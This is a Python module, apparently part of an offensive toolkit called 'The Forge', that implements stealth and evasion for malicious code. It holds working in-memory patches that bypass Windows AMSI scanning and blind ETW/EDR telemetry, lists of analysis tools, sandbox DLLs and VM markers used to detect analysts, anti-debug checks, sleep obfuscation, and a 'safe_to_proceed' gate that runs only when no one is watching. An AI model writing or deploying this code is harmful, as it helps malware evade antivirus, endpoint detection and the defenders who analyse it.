"""
The Forge — Stealth & Evasion Core
AMSI bypass, ETW patching, sandbox detection, anti-debug, sleep obfuscation.
"""

import os
import sys
import time
import random
import ctypes
import struct
import platform
import subprocess
from typing import Optional

IS_WINDOWS = platform.system() == "Windows"


# ---------------------------------------------------------------------------
# Sandbox Detection
# ---------------------------------------------------------------------------

class SandboxDetector:
    """Detect analysis environments: VMs, sandboxes, debuggers."""

    SANDBOX_PROCESSES = [
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser",
        "wireshark", "procmon", "procexp", "ollydbg", "x64dbg", "x32dbg",
        "ida", "idag", "idaq", "idaw", "idaq64", "idau", "idau64",
        "fiddler", "httpdebugger", "charles", "burpsuite",
        "processhacker", "pestudio", "autoruns",
        "dnspy", "de4dot", "ilspy",
        "regmon", "filemon", "tcpview",
        "dumpcap", "windump", "ethereal",
        "fakenet", "noriben", "sysanalyzer",
    ]

    SANDBOX_DLLS = [
        "sbiedll.dll",      # Sandboxie
        "dbghelp.dll",      # Debugger helper
        "api_log.dll",      # API monitor
        "dir_watch.dll",    # Directory watcher
        "pstorec.dll",      # Protected storage
        "vmcheck.dll",      # VM check
        "wpespy.dll",       # WPE Pro
        "cuckoomon.dll",    # Cuckoo sandbox
        "cmdvrt32.dll",     # Comodo
        "cmdvrt64.dll",
    ]

    SANDBOX_MAC_PREFIXES = [
        "08:00:27",  # VirtualBox
        "00:0C:29",  # VMware
        "00:1C:14",  # VMware
        "00:50:56",  # VMware
        "00:05:69",  # VMware
        "00:15:5D",  # Hyper-V
        "00:16:3E",  # Xen
    ]

    @staticmethod
    def check_ram(min_gb: float = 2.0) -> bool:
        """Flag if RAM is suspiciously low (sandboxes often have <2GB)."""
        try:
            if IS_WINDOWS:
                kernel32 = ctypes.windll.kernel32
                mem_status = ctypes.c_ulonglong()
                kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem_status))
                ram_gb = mem_status.value / (1024 * 1024)
            else:
                with open("/proc/meminfo") as f:
                    line = f.readline()
                    ram_kb = int(line.split()[1])
                    ram_gb = ram_kb / (1024 * 1024)
            return ram_gb < min_gb
        except Exception:
            return False

    @staticmethod
    def check_cpu_count(min_cores: int = 2) -> bool:
        """Flag if CPU core count is suspiciously low."""
        return os.cpu_count() is not None and os.cpu_count() < min_cores

    @staticmethod
    def check_disk_size(min_gb: float = 50.0) -> bool:
        """Flag if disk is too small (sandboxes use thin disks)."""
        try:
            if IS_WINDOWS:
                free = ctypes.c_ulonglong()
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    "C:\\", None, None, ctypes.byref(free)
                )
                return free.value / (1024**3) < min_gb
            else:
                stat = os.statvfs("/")
                total_gb = (stat.f_blocks * stat.f_frsize) / (1024**3)
                return total_gb < min_gb
        except Exception:
            return False

    @staticmethod
    def check_uptime(min_minutes: int = 30) -> bool:
        """Flag if system uptime is too short (just booted in a sandbox)."""
        try:
            if IS_WINDOWS:
                uptime_ms = ctypes.windll.kernel32.GetTickCount64()
                uptime_min = uptime_ms / (1000 * 60)
            else:
                with open("/proc/uptime") as f:
                    uptime_min = float(f.readline().split()[0]) / 60
            return uptime_min < min_minutes
        except Exception:
            return False

    @classmethod
    def check_processes(cls) -> bool:
        """Check if analysis tools are running."""
        try:
            if IS_WINDOWS:
                output = subprocess.check_output(
                    "tasklist /fo csv /nh", shell=True, stderr=subprocess.DEVNULL
                ).decode(errors="ignore").lower()
            else:
                output = subprocess.check_output(
                    "ps aux", shell=True, stderr=subprocess.DEVNULL
                ).decode(errors="ignore").lower()
            return any(proc in output for proc in cls.SANDBOX_PROCESSES)
        except Exception:
            return False

    @classmethod
    def check_loaded_dlls(cls) -> bool:
        """Check if sandbox DLLs are loaded (Windows only)."""
        if not IS_WINDOWS:
            return False
        try:
            kernel32 = ctypes.windll.kernel32
            for dll in cls.SANDBOX_DLLS:
                if kernel32.GetModuleHandleA(dll.encode()):
                    return True
            return False
        except Exception:
            return False

    @staticmethod
    def check_username() -> bool:
        """Flag common sandbox usernames."""
        sandbox_users = [
            "sandbox", "virus", "malware", "maltest", "test", "user",
            "currentuser", "john", "admin", "administrator", "sample",
            "cuckoo", "analyst", "analysis",
        ]
        username = os.environ.get("USERNAME", os.environ.get("USER", "")).lower()
        return username in sandbox_users

    @staticmethod
    def check_recent_files(min_files: int = 10) -> bool:
        """Real systems have many recent files. Sandboxes don't."""
        try:
            if IS_WINDOWS:
                recent = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
                if os.path.exists(recent):
                    return len(os.listdir(recent)) < min_files
            return False
        except Exception:
            return False

    @staticmethod
    def timing_check(iterations: int = 1000) -> bool:
        """Detect time acceleration (common in sandboxes)."""
        start = time.perf_counter()
        total = 0
        for i in range(iterations):
            total += i * i
        elapsed = time.perf_counter() - start
        # Real CPU should take >0.0001s for this. Accelerated sandboxes are faster.
        return elapsed < 0.00001

    @classmethod
    def is_sandbox(cls) -> dict:
        """Run all sandbox checks. Returns dict of results."""
        results = {
            "low_ram": cls.check_ram(),
            "low_cpu": cls.check_cpu_count(),
            "small_disk": cls.check_disk_size(),
            "short_uptime": cls.check_uptime(),
            "analysis_tools": cls.check_processes(),
            "sandbox_dlls": cls.check_loaded_dlls(),
            "sandbox_username": cls.check_username(),
            "no_recent_files": cls.check_recent_files(),
            "time_accelerated": cls.timing_check(),
        }
        results["score"] = sum(1 for v in results.values() if v is True)
        results["likely_sandbox"] = results["score"] >= 3
        return results


# ---------------------------------------------------------------------------
# AMSI Bypass (Windows)
# ---------------------------------------------------------------------------

class AMSIBypass:
    """
    Bypass Windows Antimalware Scan Interface.
    Multiple techniques to patch AmsiScanBuffer.
    """

    @staticmethod
    def patch_amsi_scan_buffer() -> bool:
        """Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN."""
        if not IS_WINDOWS:
            return False
        try:
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            addr = ctypes.windll.kernel32.GetProcAddress(
                ctypes.cast(amsi._handle, ctypes.c_void_p).value,
                b"AmsiScanBuffer"
            )
            if not addr:
                return False

            # Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
            # This makes AMSI think the scan input is invalid → skips
            if struct.calcsize("P") == 8:  # x64
                patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 0x80070057; ret
            else:  # x86
                patch = b"\xB8\x57\x00\x07\x80\xC2\x18\x00"  # mov eax, ...; ret 0x18

            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                addr, len(patch), 0x40, ctypes.byref(old_protect)  # PAGE_EXECUTE_READWRITE
            )
            ctypes.memmove(addr, patch, len(patch))
            ctypes.windll.kernel32.VirtualProtect(
                addr, len(patch), old_protect.value, ctypes.byref(old_protect)
            )
            return True
        except Exception:
            return False

    @staticmethod
    def force_amsi_error() -> bool:
        """Force AmsiInitialize to fail by corrupting the AMSI context."""
        if not IS_WINDOWS:
            return False
        try:
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            addr = ctypes.windll.kernel32.GetProcAddress(
                ctypes.cast(amsi._handle, ctypes.c_void_p).value,
                b"AmsiOpenSession"
            )
            if not addr:
                return False

            # Patch first byte to ret
            patch = b"\xC3"
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                addr, 1, 0x40, ctypes.byref(old_protect)
            )
            ctypes.memmove(addr, patch, 1)
            ctypes.windll.kernel32.VirtualProtect(
                addr, 1, old_protect.value, ctypes.byref(old_protect)
            )
            return True
        except Exception:
            return False


# ---------------------------------------------------------------------------
# ETW Patching (Windows)
# ---------------------------------------------------------------------------

class ETWPatcher:
    """Patch Event Tracing for Windows to blind EDR telemetry."""

    @staticmethod
    def patch_etw_event_write() -> bool:
        """Patch EtwEventWrite in ntdll to return immediately."""
        if not IS_WINDOWS:
            return False
        try:
            ntdll = ctypes.windll.ntdll
            addr = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
                b"EtwEventWrite"
            )
            if not addr:
                return False

            # xor eax, eax; ret → return STATUS_SUCCESS
            patch = b"\x33\xC0\xC3" if struct.calcsize("P") == 8 else b"\x33\xC0\xC2\x14\x00"

            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                addr, len(patch), 0x40, ctypes.byref(old_protect)
            )
            ctypes.memmove(addr, patch, len(patch))
            ctypes.windll.kernel32.VirtualProtect(
                addr, len(patch), old_protect.value, ctypes.byref(old_protect)
            )
            return True
        except Exception:
            return False


# ---------------------------------------------------------------------------
# Anti-Debug
# ---------------------------------------------------------------------------

class AntiDebug:
    """Detection and evasion of debugging tools."""

    @staticmethod
    def is_debugger_present() -> bool:
        """Check if a debugger is attached (Windows API)."""
        if IS_WINDOWS:
            try:
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except Exception:
                return False
        else:
            try:
                with open("/proc/self/status") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            return int(line.split(":")[1].strip()) != 0
                return False
            except Exception:
                return False

    @staticmethod
    def check_remote_debugger() -> bool:
        """Check for remote debugger (Windows)."""
        if not IS_WINDOWS:
            return False
        try:
            is_remote = ctypes.c_int(0)
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(is_remote)
            )
            return is_remote.value != 0
        except Exception:
            return False

    @staticmethod
    def timing_anti_debug() -> bool:
        """Use timing to detect single-stepping debuggers."""
        start = time.perf_counter_ns()
        _ = sum(range(100))
        elapsed = time.perf_counter_ns() - start
        # If single-stepping, this would take much longer
        return elapsed > 10_000_000  # >10ms is suspicious


# ---------------------------------------------------------------------------
# Sleep Obfuscation
# ---------------------------------------------------------------------------

class SleepObfuscation:
    """Make sleep calls less predictable to avoid pattern detection."""

    @staticmethod
    def jitter_sleep(base_seconds: float, jitter_pct: float = 0.3):
        """Sleep with random jitter (±jitter_pct)."""
        deviation = base_seconds * jitter_pct
        actual = base_seconds + random.uniform(-deviation, deviation)
        time.sleep(max(0.1, actual))

    @staticmethod
    def staged_sleep(total_seconds: float, stages: int = 5):
        """Break sleep into multiple stages to avoid long-sleep detection."""
        per_stage = total_seconds / stages
        for _ in range(stages):
            jitter = per_stage * random.uniform(0.8, 1.2)
            time.sleep(max(0.05, jitter))

    @staticmethod
    def cpu_burn_sleep(seconds: float):
        """Simulate sleep with CPU activity (avoids idle-based detection)."""
        end = time.perf_counter() + seconds
        while time.perf_counter() < end:
            _ = random.random() * random.random()

    @staticmethod
    def event_based_sleep(seconds: float):
        """Use threading Event for interruptible sleep."""
        import threading
        event = threading.Event()
        event.wait(timeout=seconds)


# ---------------------------------------------------------------------------
# Process Utilities
# ---------------------------------------------------------------------------

def get_parent_pid() -> Optional[int]:
    """Get parent process ID."""
    try:
        if IS_WINDOWS:
            import ctypes.wintypes
            # Using NtQueryInformationProcess would be more reliable
            # but this works for basic cases
            return os.getppid()
        else:
            return os.getppid()
    except Exception:
        return None


def is_elevated() -> bool:
    """Check if running with elevated/admin privileges."""
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Quick API
# ---------------------------------------------------------------------------

def full_stealth_check() -> dict:
    """Run all stealth checks and return combined report."""
    sandbox = SandboxDetector.is_sandbox()
    return {
        "sandbox": sandbox,
        "debugger_attached": AntiDebug.is_debugger_present(),
        "remote_debugger": AntiDebug.check_remote_debugger(),
        "timing_anomaly": AntiDebug.timing_anti_debug(),
        "is_elevated": is_elevated(),
        "is_windows": IS_WINDOWS,
        "safe_to_proceed": (
            not sandbox["likely_sandbox"]
            and not AntiDebug.is_debugger_present()
            and not AntiDebug.check_remote_debugger()
        ),
    }
